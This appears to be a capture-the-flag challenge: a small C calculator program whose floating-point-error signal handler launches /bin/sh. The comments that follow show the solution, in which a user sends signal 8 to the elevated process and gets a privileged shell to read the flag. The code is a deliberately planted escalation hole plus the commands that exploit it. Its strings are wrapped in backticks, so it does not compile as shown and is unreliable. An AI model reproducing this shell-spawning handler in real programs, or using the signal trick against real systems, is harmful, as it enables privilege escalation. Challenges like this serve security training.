#include < stdio.h >
#include < signal.h >
#include < stdlib.h >
#include < fenv.h >
  void signal_handler(int signo, siginfo_t * si, void * data) {
    if (signo == SIGFPE) {
      char * sh[2];
      sh[0] = `/bin/sh`;
      sh[1] = NULL;
      execve(sh[0], sh, NULL);
    }
  }

main() {
  char op;
  int op1, op2;
  struct sigaction sa = {};
  sa.sa_flags = SA_ONSTACK | SA_RESTART | SA_SIGINFO;
  sa.sa_sigaction = signal_handler;
  sigaction(SIGFPE, & sa, 0);
  printf(`Welcome to PwnerRank calculator ! \n`);
  printf(`Enter an operator (+, -, *, /): `);
  scanf(`%c`, & op);
  printf(`Enter two operands: `);
  scanf(`%d %d`, & op1, & op2);
  switch (op) {
  case '+':
    printf(`%d + %d = %d`, op1, op2, op1 + op2);
    break;
  case '-':
    printf(`%d - %d = %d`, op1, op2, op1 - op2);
    break;
  case '*':
    printf(`%d * %d = %d`, op1, op2, op1 * op2);
    break;
  case '/':
    printf(`%d / %d = %d`, op1, op2, op1 / op2);
    break;
  default:
    printf(`Error! operator is not correct`);
  }
  printf(`\n`);
  return 0;
}

// Console 1
// pwn1@binary-challenges-pwnerrank-com:~$ ./pwnme
// Welcome to PwnerRank calculator !
// Enter an operator (+, -, *, /): $ id
// uid=1006(pwn1) gid=1006(pwn1) euid=1007(pwn1pwn) groups=1006(pwn1)
// $ cat .flag

// Console 2
// pwn1@binary-challenges-pwnerrank-com:~$ ps -ef|grep pwn1pwn
// pwn1pwn  13915 13885  0 12:37 pts/13   00:00:00 ./pwnme
// pwn1@binary-challenges-pwnerrank-com:~$ kill -8 13915